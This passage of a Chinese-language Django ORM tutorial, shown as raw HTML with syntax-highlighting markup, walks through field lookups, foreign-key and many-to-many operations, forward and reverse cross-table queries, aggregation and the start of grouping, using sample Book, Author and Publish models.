&#x800C;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x811A;&#x672C;&#x5373;&#x53EF;

&#x811A;&#x672C;&#x4EE3;&#x7801;&#x65E0;&#x8BBA;&#x662F;&#x5199;&#x5728;&#x5E94;&#x7528;&#x4E0B;&#x7684;tests.py&#x8FD8;&#x662F;&#x81EA;&#x5DF1;&#x5355;&#x72EC;&#x5F00;&#x8BBE;py&#x6587;&#x4EF6;&#x90FD;&#x53EF;&#x4EE5;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#x7684;&#x51C6;&#x5907; &#x53BB;manage.py&#x4E2D;&#x62F7;&#x8D1D;&#x524D;&#x56DB;&#x884C;&#x4EE3;&#x7801; &#x7136;&#x540E;&#x81EA;&#x5DF1;&#x5199;&#x4E24;&#x884C;</span>
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    os.environ.setdefault(<span class="hljs-string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="hljs-string">&quot;day64.settings&quot;</span>)
    <span class="hljs-keyword">import</span> django
    django.setup()
    <span class="hljs-comment"># &#x5728;&#x8FD9;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x7684;&#x4E0B;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x6D4B;&#x8BD5;django&#x91CC;&#x9762;&#x7684;&#x5355;&#x4E2A;py&#x6587;&#x4EF6;&#x4E86;</span>
</code></pre>
<h4 id="&#x67E5;&#x770B;&#x5185;&#x90E8;sql&#x8BED;&#x53E5;&#x7684;&#x65B9;&#x5F0F;">&#x67E5;&#x770B;&#x5185;&#x90E8;sql&#x8BED;&#x53E5;&#x7684;&#x65B9;&#x5F0F;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x65B9;&#x5F0F;1</span>
res = models.User.objects.values_list(<span class="hljs-string">&apos;name&apos;</span>,<span class="hljs-string">&apos;age&apos;</span>)  <span class="hljs-comment"># &lt;QuerySet [(&apos;jason&apos;, 18), (&apos;egonPPP&apos;, 84)]&gt;</span>
print(res.query)
queryset&#x5BF9;&#x8C61;&#x624D;&#x80FD;&#x591F;&#x70B9;&#x51FB;query&#x67E5;&#x770B;&#x5185;&#x90E8;&#x7684;sql&#x8BED;&#x53E5;

<span class="hljs-comment"># &#x65B9;&#x5F0F;2:&#x6240;&#x6709;&#x7684;sql&#x8BED;&#x53E5;&#x90FD;&#x80FD;&#x67E5;&#x770B;</span>
<span class="hljs-comment"># &#x53BB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x5373;&#x53EF;</span>
LOGGING = {
    <span class="hljs-string">&apos;version&apos;</span>: <span class="hljs-number">1</span>,
    <span class="hljs-string">&apos;disable_existing_loggers&apos;</span>: <span class="hljs-keyword">False</span>,
    <span class="hljs-string">&apos;handlers&apos;</span>: {
        <span class="hljs-string">&apos;console&apos;</span>:{
            <span class="hljs-string">&apos;level&apos;</span>:<span class="hljs-string">&apos;DEBUG&apos;</span>,
            <span class="hljs-string">&apos;class&apos;</span>:<span class="hljs-string">&apos;logging.StreamHandler&apos;</span>,
        },
    },
    <span class="hljs-string">&apos;loggers&apos;</span>: {
        <span class="hljs-string">&apos;django.db.backends&apos;</span>: {
            <span class="hljs-string">&apos;handlers&apos;</span>: [<span class="hljs-string">&apos;console&apos;</span>],
            <span class="hljs-string">&apos;propagate&apos;</span>: <span class="hljs-keyword">True</span>,
            <span class="hljs-string">&apos;level&apos;</span>:<span class="hljs-string">&apos;DEBUG&apos;</span>,
        },
    }
}
</code></pre>
<h4 id="&#x795E;&#x5947;&#x7684;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x67E5;&#x8BE2;">&#x795E;&#x5947;&#x7684;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x67E5;&#x8BE2;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x795E;&#x5947;&#x7684;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># 1 &#x5E74;&#x9F84;&#x5927;&#x4E8E;35&#x5C81;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__gt=35)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 2 &#x5E74;&#x9F84;&#x5C0F;&#x4E8E;35&#x5C81;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__lt=35)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x5927;&#x4E8E;&#x7B49;&#x4E8E; &#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__gte=32)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__lte=32)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x5E74;&#x9F84;&#x662F;18 &#x6216;&#x8005; 32 &#x6216;&#x8005;40</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__in=[18,32,40])</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x5E74;&#x9F84;&#x5728;18&#x5230;40&#x5C81;&#x4E4B;&#x95F4;&#x7684;  &#x9996;&#x5C3E;&#x90FD;&#x8981;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(age__range=[18,40])</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># &#x67E5;&#x8BE2;&#x51FA;&#x540D;&#x5B57;&#x91CC;&#x9762;&#x542B;&#x6709;s&#x7684;&#x6570;&#x636E;  &#x6A21;&#x7CCA;&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(name__contains=&apos;s&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># &#x662F;&#x5426;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;  &#x67E5;&#x8BE2;&#x51FA;&#x540D;&#x5B57;&#x91CC;&#x9762;&#x542B;&#x6709;p&#x7684;&#x6570;&#x636E;  &#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(name__contains=&apos;p&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x5FFD;&#x7565;&#x5927;&#x5C0F;&#x5199;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(name__icontains=&apos;p&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># res = models.User.objects.filter(name__startswith=&apos;j&apos;)</span>
    <span class="hljs-comment"># res1 = models.User.objects.filter(name__endswith=&apos;j&apos;)</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># print(res,res1)</span>


    <span class="hljs-comment"># &#x67E5;&#x8BE2;&#x51FA;&#x6CE8;&#x518C;&#x65F6;&#x95F4;&#x662F; 2020 1&#x6708;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(register_time__month=&apos;1&apos;)</span>
    <span class="hljs-comment"># res = models.User.objects.filter(register_time__year=&apos;2020&apos;)</span>
</code></pre>
<h4 id="&#x4E00;&#x5BF9;&#x591A;&#x5916;&#x952E;&#x589E;&#x5220;&#x6539;&#x67E5;">&#x4E00;&#x5BF9;&#x591A;&#x5916;&#x952E;&#x589E;&#x5220;&#x6539;&#x67E5;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x4E00;&#x5BF9;&#x591A;&#x5916;&#x952E;&#x589E;&#x5220;&#x6539;&#x67E5;</span>
    <span class="hljs-comment"># &#x589E;</span>
    <span class="hljs-comment"># 1  &#x76F4;&#x63A5;&#x5199;&#x5B9E;&#x9645;&#x5B57;&#x6BB5; id</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x8BBA;&#x8BED;&apos;,price=899.23,publish_id=1)</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x804A;&#x658B;&apos;,price=444.23,publish_id=2)</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x8001;&#x5B50;&apos;,price=333.66,publish_id=1)</span>
    <span class="hljs-comment"># 2  &#x865A;&#x62DF;&#x5B57;&#x6BB5; &#x5BF9;&#x8C61;</span>
    <span class="hljs-comment"># publish_obj = models.Publish.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># models.Book.objects.create(title=&apos;&#x7EA2;&#x697C;&#x68A6;&apos;,price=666.23,publish=publish_obj)</span>

    <span class="hljs-comment"># &#x5220;</span>
    <span class="hljs-comment"># models.Publish.objects.filter(pk=1).delete()  # &#x7EA7;&#x8054;&#x5220;&#x9664;</span>

    <span class="hljs-comment"># &#x4FEE;&#x6539;</span>
    <span class="hljs-comment"># models.Book.objects.filter(pk=1).update(publish_id=2)</span>
    <span class="hljs-comment"># publish_obj = models.Publish.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># models.Book.objects.filter(pk=1).update(publish=publish_obj)</span>
</code></pre>
<h4 id="&#x591A;&#x5BF9;&#x591A;&#x5916;&#x952E;&#x589E;&#x5220;&#x6539;&#x67E5;">&#x591A;&#x5BF9;&#x591A;&#x5916;&#x952E;&#x589E;&#x5220;&#x6539;&#x67E5;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5982;&#x4F55;&#x7ED9;&#x4E66;&#x7C4D;&#x6DFB;&#x52A0;&#x4F5C;&#x8005;&#xFF1F;</span>
    book_obj = models.Book.objects.filter(pk=<span class="hljs-number">1</span>).first()
    <span class="hljs-comment"># print(book_obj.authors)  # &#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x4F60;&#x5DF2;&#x7ECF;&#x5230;&#x4E86;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x4E86;</span>
    <span class="hljs-comment"># book_obj.authors.add(1)  # &#x4E66;&#x7C4D;id&#x4E3A;1&#x7684;&#x4E66;&#x7C4D;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;&#x4E3B;&#x952E;&#x4E3A;1 &#x7684;&#x4F5C;&#x8005;</span>
    <span class="hljs-comment"># book_obj.authors.add(2,3)</span>

    <span class="hljs-comment"># author_obj = models.Author.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># author_obj1 = models.Author.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># author_obj2 = models.Author.objects.filter(pk=3).first()</span>
    <span class="hljs-comment"># book_obj.authors.add(author_obj)</span>
    <span class="hljs-comment"># book_obj.authors.add(author_obj1,author_obj2)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    add&#x7ED9;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x6DFB;&#x52A0;&#x6570;&#x636E;
        &#x62EC;&#x53F7;&#x5185;&#x65E2;&#x53EF;&#x4EE5;&#x4F20;&#x6570;&#x5B57;&#x4E5F;&#x53EF;&#x4EE5;&#x4F20;&#x5BF9;&#x8C61; &#x5E76;&#x4E14;&#x90FD;&#x652F;&#x6301;&#x591A;&#x4E2A;
    &quot;&quot;&quot;</span>

    <span class="hljs-comment"># &#x5220;</span>
    <span class="hljs-comment"># book_obj.authors.remove(2)</span>
    <span class="hljs-comment"># book_obj.authors.remove(1,3)</span>

    <span class="hljs-comment"># author_obj = models.Author.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># author_obj1 = models.Author.objects.filter(pk=3).first()</span>
    <span class="hljs-comment"># book_obj.authors.remove(author_obj,author_obj1)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    remove
        &#x62EC;&#x53F7;&#x5185;&#x65E2;&#x53EF;&#x4EE5;&#x4F20;&#x6570;&#x5B57;&#x4E5F;&#x53EF;&#x4EE5;&#x4F20;&#x5BF9;&#x8C61; &#x5E76;&#x4E14;&#x90FD;&#x652F;&#x6301;&#x591A;&#x4E2A;
    &quot;&quot;&quot;</span>


    <span class="hljs-comment"># &#x4FEE;&#x6539;</span>
    <span class="hljs-comment"># book_obj.authors.set([1,2])  # &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x7ED9;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;</span>
    <span class="hljs-comment"># book_obj.authors.set([3])  # &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x7ED9;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;</span>

    <span class="hljs-comment"># author_obj = models.Author.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># author_obj1 = models.Author.objects.filter(pk=3).first()</span>
    <span class="hljs-comment"># book_obj.authors.set([author_obj,author_obj1])  # &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x7ED9;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;</span>

    <span class="hljs-string">&quot;&quot;&quot;
    set
        &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x4F20;&#x4E00;&#x4E2A;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;&#xFF0C;&#x8BE5;&#x5BF9;&#x8C61;&#x5185;&#x65E2;&#x53EF;&#x4EE5;&#x6570;&#x5B57;&#x4E5F;&#x53EF;&#x4EE5;&#x5BF9;&#x8C61; &#x5E76;&#x4E14;&#x90FD;&#x652F;&#x6301;&#x591A;&#x4E2A;
    &quot;&quot;&quot;</span>


    <span class="hljs-comment"># &#x6E05;&#x7A7A;</span>
    <span class="hljs-comment"># &#x5728;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;&#x4E2D;&#x6E05;&#x7A7A;&#x67D0;&#x4E2A;&#x4E66;&#x7C4D;&#x4E0E;&#x4F5C;&#x8005;&#x7684;&#x7ED1;&#x5B9A;&#x5173;&#x7CFB;</span>
    book_obj.authors.clear()
    <span class="hljs-string">&quot;&quot;&quot;
    clear
        &#x62EC;&#x53F7;&#x5185;&#x4E0D;&#x8981;&#x52A0;&#x4EFB;&#x4F55;&#x53C2;&#x6570;

    &quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x6B63;&#x53CD;&#x5411;&#x7684;&#x6982;&#x5FF5;">&#x6B63;&#x53CD;&#x5411;&#x7684;&#x6982;&#x5FF5;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x6B63;&#x5411;</span>
<span class="hljs-comment"># &#x53CD;&#x5411;</span>
  &#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5728;&#x6211;&#x624B;&#x4E0A;&#x90A3;&#x4E48;&#xFF0C;&#x6211;&#x67E5;&#x4F60;&#x5C31;&#x662F;&#x6B63;&#x5411;
  &#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5982;&#x679C;&#x4E0D;&#x5728;&#x624B;&#x4E0A;&#xFF0C;&#x6211;&#x67E5;&#x4F60;&#x5C31;&#x662F;&#x53CD;&#x5411;

  book &gt;&gt;&gt;&#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5728;&#x4E66;&#x90A3;&#x513F;(&#x6B63;&#x5411;)&gt;&gt;&gt; publish
  publish    &gt;&gt;&gt;&#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5728;&#x4E66;&#x90A3;&#x513F;(&#x53CD;&#x5411;)&gt;&gt;&gt;book

  &#x4E00;&#x5BF9;&#x4E00;&#x548C;&#x591A;&#x5BF9;&#x591A;&#x6B63;&#x53CD;&#x5411;&#x7684;&#x5224;&#x65AD;&#x4E5F;&#x662F;&#x5982;&#x6B64;

<span class="hljs-string">&quot;&quot;&quot;
&#x6B63;&#x5411;&#x67E5;&#x8BE2;&#x6309;&#x5B57;&#x6BB5;
&#x53CD;&#x5411;&#x67E5;&#x8BE2;&#x6309;&#x8868;&#x540D;&#x5C0F;&#x5199;
                _set
                ...
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x591A;&#x8868;&#x67E5;&#x8BE2;">&#x591A;&#x8868;&#x67E5;&#x8BE2;</h4>
<h4 id="&#x5B50;&#x67E5;&#x8BE2;&#x57FA;&#x4E8E;&#x5BF9;&#x8C61;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;">&#x5B50;&#x67E5;&#x8BE2;(&#x57FA;&#x4E8E;&#x5BF9;&#x8C61;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;)</h4>
<pre><code class="lang-python"><span class="hljs-comment"># 1.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;1&#x7684;&#x51FA;&#x7248;&#x793E;</span>
    <span class="hljs-comment"># book_obj = models.Book.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># # &#x4E66;&#x67E5;&#x51FA;&#x7248;&#x793E; &#x6B63;&#x5411;</span>
    <span class="hljs-comment"># res = book_obj.publish</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># print(res.name)</span>
    <span class="hljs-comment"># print(res.addr)</span>

    <span class="hljs-comment"># 2.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;2&#x7684;&#x4F5C;&#x8005;</span>
    <span class="hljs-comment"># book_obj = models.Book.objects.filter(pk=2).first()</span>
    <span class="hljs-comment"># # &#x4E66;&#x67E5;&#x4F5C;&#x8005; &#x6B63;&#x5411;</span>
    <span class="hljs-comment"># # res = book_obj.authors  # app01.Author.None</span>
    <span class="hljs-comment"># res = book_obj.authors.all()  # &lt;QuerySet [&lt;Author: Author object&gt;, &lt;Author: Author object&gt;]&gt;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 3.&#x67E5;&#x8BE2;&#x4F5C;&#x8005;jason&#x7684;&#x7535;&#x8BDD;&#x53F7;&#x7801;</span>
    <span class="hljs-comment"># author_obj = models.Author.objects.filter(name=&apos;jason&apos;).first()</span>
    <span class="hljs-comment"># res = author_obj.author_detail</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># print(res.phone)</span>
    <span class="hljs-comment"># print(res.addr)</span>

    <span class="hljs-string">&quot;&quot;&quot;
    &#x5728;&#x4E66;&#x5199;orm&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x8DDF;&#x5199;sql&#x8BED;&#x53E5;&#x4E00;&#x6837;&#x7684;
    &#x4E0D;&#x8981;&#x4F01;&#x56FE;&#x4E00;&#x6B21;&#x6027;&#x5C06;orm&#x8BED;&#x53E5;&#x5199;&#x5B8C; &#x5982;&#x679C;&#x6BD4;&#x8F83;&#x590D;&#x6742; &#x5C31;&#x5199;&#x4E00;&#x70B9;&#x770B;&#x4E00;&#x70B9;

    &#x6B63;&#x5411;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x9700;&#x8981;&#x52A0;.all()
        &#x5F53;&#x4F60;&#x7684;&#x7ED3;&#x679C;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x4E2A;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x9700;&#x8981;&#x52A0;.all()
        &#x5982;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#x5219;&#x76F4;&#x63A5;&#x62FF;&#x5230;&#x6570;&#x636E;&#x5BF9;&#x8C61;
            book_obj.publish
            book_obj.authors.all()
            author_obj.author_detail
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># 4.&#x67E5;&#x8BE2;&#x51FA;&#x7248;&#x793E;&#x662F;&#x4E1C;&#x65B9;&#x51FA;&#x7248;&#x793E;&#x51FA;&#x7248;&#x7684;&#x4E66;</span>
    <span class="hljs-comment"># publish_obj = models.Publish.objects.filter(name=&apos;&#x4E1C;&#x65B9;&#x51FA;&#x7248;&#x793E;&apos;).first()</span>
    <span class="hljs-comment"># &#x51FA;&#x7248;&#x793E;&#x67E5;&#x4E66;  &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = publish_obj.book_set  # app01.Book.None</span>
    <span class="hljs-comment"># res = publish_obj.book_set.all()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 5.&#x67E5;&#x8BE2;&#x4F5C;&#x8005;&#x662F;jason&#x5199;&#x8FC7;&#x7684;&#x4E66;</span>
    <span class="hljs-comment"># author_obj = models.Author.objects.filter(name=&apos;jason&apos;).first()</span>
    <span class="hljs-comment"># &#x4F5C;&#x8005;&#x67E5;&#x4E66;      &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = author_obj.book_set  # app01.Book.None</span>
    <span class="hljs-comment"># res = author_obj.book_set.all()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 6.&#x67E5;&#x8BE2;&#x624B;&#x673A;&#x53F7;&#x662F;110&#x7684;&#x4F5C;&#x8005;&#x59D3;&#x540D;</span>
    <span class="hljs-comment"># author_detail_obj = models.AuthorDetail.objects.filter(phone=110).first()</span>
    <span class="hljs-comment"># res = author_detail_obj.author</span>
    <span class="hljs-comment"># print(res.name)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x57FA;&#x4E8E;&#x5BF9;&#x8C61; 
        &#x53CD;&#x5411;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;
            &#x5F53;&#x4F60;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x7684;&#x65F6;&#x5019; &#x5C31;&#x5FC5;&#x987B;&#x52A0;_set.all()
            &#x5F53;&#x4F60;&#x7684;&#x7ED3;&#x679C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7684;&#x65F6;&#x5019; &#x4E0D;&#x9700;&#x8981;&#x52A0;_set.all()
        &#x81EA;&#x5DF1;&#x603B;&#x7ED3;&#x51FA; &#x81EA;&#x5DF1;&#x65B9;&#x4FBF;&#x8BB0;&#x5FC6;&#x7684;&#x5373;&#x53EF; &#x6BCF;&#x4E2A;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x4E0D;&#x4E00;&#x6837;
    &quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x8054;&#x8868;&#x67E5;&#x8BE2;&#x57FA;&#x4E8E;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;">&#x8054;&#x8868;&#x67E5;&#x8BE2;(&#x57FA;&#x4E8E;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;)</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x57FA;&#x4E8E;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;&#x7684;&#x8DE8;&#x8868;&#x67E5;&#x8BE2;</span>


    <span class="hljs-comment"># 1.&#x67E5;&#x8BE2;jason&#x7684;&#x624B;&#x673A;&#x53F7;&#x548C;&#x4F5C;&#x8005;&#x59D3;&#x540D;</span>
    <span class="hljs-comment"># res = models.Author.objects.filter(name=&apos;jason&apos;).values(&apos;author_detail__phone&apos;,&apos;name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = models.AuthorDetail.objects.filter(author__name=&apos;jason&apos;)  # &#x62FF;&#x4F5C;&#x8005;&#x59D3;&#x540D;&#x662F;jason&#x7684;&#x4F5C;&#x8005;&#x8BE6;&#x60C5;</span>
    <span class="hljs-comment"># res = models.AuthorDetail.objects.filter(author__name=&apos;jason&apos;).values(&apos;phone&apos;,&apos;author__name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>


    <span class="hljs-comment"># 2.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;1&#x7684;&#x51FA;&#x7248;&#x793E;&#x540D;&#x79F0;&#x548C;&#x4E66;&#x7684;&#x540D;&#x79F0;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(pk=1).values(&apos;title&apos;,&apos;publish__name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = models.Publish.objects.filter(book__id=1).values(&apos;name&apos;,&apos;book__title&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 3.&#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x4E3A;1&#x7684;&#x4F5C;&#x8005;&#x59D3;&#x540D;</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(pk=1).values(&apos;authors__name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &#x53CD;&#x5411;</span>
    <span class="hljs-comment"># res = models.Author.objects.filter(book__id=1).values(&apos;name&apos;)</span>
    <span class="hljs-comment"># print(res)</span>


    <span class="hljs-comment"># &#x67E5;&#x8BE2;&#x4E66;&#x7C4D;&#x4E3B;&#x952E;&#x662F;1&#x7684;&#x4F5C;&#x8005;&#x7684;&#x624B;&#x673A;&#x53F7;</span>
    <span class="hljs-comment"># book author authordetail</span>
    <span class="hljs-comment"># res = models.Book.objects.filter(pk=1).values(&apos;authors__author_detail__phone&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x4F60;&#x53EA;&#x8981;&#x638C;&#x63E1;&#x4E86;&#x6B63;&#x53CD;&#x5411;&#x7684;&#x6982;&#x5FF5;
    &#x4EE5;&#x53CA;&#x53CC;&#x4E0B;&#x5212;&#x7EBF;
    &#x90A3;&#x4E48;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x65E0;&#x9650;&#x5236;&#x7684;&#x8DE8;&#x8868;

    &quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x805A;&#x5408;&#x67E5;&#x8BE2;">&#x805A;&#x5408;&#x67E5;&#x8BE2;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x805A;&#x5408;&#x67E5;&#x8BE2;      aggregate</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x805A;&#x5408;&#x67E5;&#x8BE2;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x662F;&#x914D;&#x5408;&#x5206;&#x7EC4;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#x7684;
    &#x53EA;&#x8981;&#x662F;&#x8DDF;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684;&#x6A21;&#x5757;
        &#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x5728;django.db.models&#x91CC;&#x9762;
        &#x5982;&#x679C;&#x4E0A;&#x8FF0;&#x6CA1;&#x6709;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x5728;django.db&#x91CC;&#x9762;
    &quot;&quot;&quot;</span>
    <span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> models
    <span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Max,Min,Sum,Count,Avg
    <span class="hljs-comment"># 1 &#x6240;&#x6709;&#x4E66;&#x7684;&#x5E73;&#x5747;&#x4EF7;&#x683C;</span>
    <span class="hljs-comment"># res = models.Book.objects.aggregate(Avg(&apos;price&apos;))</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 2.&#x4E0A;&#x8FF0;&#x65B9;&#x6CD5;&#x4E00;&#x6B21;&#x6027;&#x4F7F;&#x7528;</span>
    res = models.Book.objects.aggregate(Max(<span class="hljs-string">&apos;price&apos;</span>),Min(<span class="hljs-string">&apos;price&apos;</span>),Sum(<span class="hljs-string">&apos;price&apos;</span>),Count(<span class="hljs-string">&apos;pk&apos;</span>),Avg(<span class="hljs-string">&apos;price&apos;</span>))
    print(res)
</code></pre>
<h4 id="&#x5206;&#x7EC4;&#x67E5;&#x8BE2;">&#x5206;&#x7EC4;&#x67E5;&#x8BE2;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5206;&#x7EC4;&#x67E5;&#x8BE2;  annotate</span>
    <span class="hljs-string">&quot;&quot;&quot;
    MySQL&#x5206;&#x7EC4;&#x67E5;&#x8BE2;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x7279;&#x70B9;
        &#x5206;&#x7EC4;&#x4E4B;&#x540E;&#x9ED8;&#x8BA4;&#x53EA;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x5206;&#x7EC4;&#x7684;&#x4F9D;&#x636E; &#x7EC4;&#x5185;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x90FD;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x4E86;
            &#x4E25;&#x683C;&#x6A21;&#x5F0F;
                ONLY_FULL_GROUP_BY

    &quot;&quot;&quot;</span>
    <span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Max, Min, Sum, Count, Avg
    <span class="hljs-comment"># 1.&#x7EDF;&#x8BA1;&#x6BCF;&#x4E00;&#x672C;&#x4E66;&#x7684;&#x4F5C;&#x8005;&#x4E2A;&#x6570;</span>
    <span class="hljs-comment"># res = models.Book.objects.annotate()  # models&#x540E;&#x9762;&#x70B9;&#x4EC0;&#x4E48; &#x5C31;&#x662F;&#x6309;&#x4EC0;&#x4E48;&#x5206;&#x7EC4;</span>
